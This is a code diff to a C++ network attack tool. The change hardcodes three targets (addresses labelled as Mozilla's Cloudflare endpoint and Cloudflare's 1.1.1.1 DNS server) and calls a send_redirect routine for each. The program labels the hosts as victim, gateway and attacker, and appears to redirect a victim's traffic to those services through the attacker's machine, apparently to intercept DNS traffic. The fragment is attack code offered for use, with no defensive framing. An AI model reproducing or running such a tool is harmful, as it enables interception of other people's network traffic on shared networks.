@@ -238,8 +238,10 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    string destination = argv[1];
-    string iface = argv[2];
+    string destination  = "162.159.61.4"; // mozilla.cloudflare.com
+    string destination2 = "172.64.41.4"; // mozilla.cloudflare.com
+    string destination3 = "1.1.1.1"; // cloudflare dns server
+    string iface = argv[1]; // self interface
 
     if (!get_local_info(iface, self_mac, &self_ip, &ifindex)) return 0;
 
@@ -259,6 +261,7 @@ int main(int argc, char* argv[]) {
     cout << "Victim IP: " << devices[v_idx].ip << ", Gateway IP: " << devices[g_idx].ip << ", Attacker IP: " << inet_ntoa(self_ip) << endl;
 
     send_redirect(devices[v_idx].ip, devices[g_idx].ip, inet_ntoa(self_ip), destination); // victim, gateway, attacker, destination
-
+    send_redirect(devices[v_idx].ip, devices[g_idx].ip, inet_ntoa(self_ip), destination2); // victim, gateway, attacker, destination2
+    send_redirect(devices[v_idx].ip, devices[g_idx].ip, inet_ntoa(self_ip), destination3); // victim, gateway, attacker, destination3
     return 0;
 }
